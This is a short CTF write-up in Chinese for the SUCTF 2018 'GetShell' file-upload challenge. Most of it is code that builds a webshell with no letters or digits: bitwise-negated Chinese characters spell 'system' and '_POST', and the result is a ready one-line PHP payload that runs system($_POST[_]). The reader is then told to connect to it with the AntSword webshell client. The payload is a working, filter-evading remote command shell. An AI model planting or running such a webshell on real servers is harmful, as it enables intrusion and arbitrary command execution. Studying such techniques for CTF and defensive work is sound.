## [SUCTF 2018]GetShell

文件上传题目

![image-20230414213323837](https://raw.githubusercontent.com/leekosss/photoBed/master/202304142133986.png)

发现在第五个之后，会对字符进行过滤，我们上传的时候抓包：

![image-20230414213747146](https://raw.githubusercontent.com/leekosss/photoBed/master/202304151523798.png)



经过测试，发现字母、数字都被过滤了。典型的无字母数字webshell

`+ | ^ % > < '` 等字符被过滤了，所以我们只能使用取反 `~` 绕过

测试得知，中文不会被绕过，所以我们需要使用中文取反

这里总结一下使用中文取反的汉字：

![14872686600768.jpg](https://raw.githubusercontent.com/leekosss/photoBed/master/202304142232472.jpeg)

```php
<?php
echo ~"区"[1].PHP_EOL;
echo ~"冈"[1].PHP_EOL;
echo ~"勺"[1].PHP_EOL;
echo ~"皮"[1].PHP_EOL;
echo ~"针"[1].PHP_EOL;
// system
echo ~"码"[1].PHP_EOL;
echo ~"寸"[1].PHP_EOL;
echo ~"小"[1].PHP_EOL;
echo ~"欠"[1].PHP_EOL;
echo ~"立"[1].PHP_EOL;
// _POST
```

根据以上这些汉字，我们就可以构造出我们想要的命令执行了

```php
<?php
$_=[]; //array
$__=$_.$_; //arrayarray
$_=($_==$__);//$_=(array==arrayarray)明显不相同 false 0
$__=($_==$_);//$__=(array==array) 相同返回1

$____ = ~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];//system
$___ = ~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];//_POST


$____($$__[_]);//也就是system($_POST[_])

```

payload:

```php
<?=$_=[];$__=$_.$_;$_=($_==$__);$__=($_==$_);$___=~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];$____=~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];$___($$____[_]);
```

直接蚁剑连接即可

[无字母数字webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)

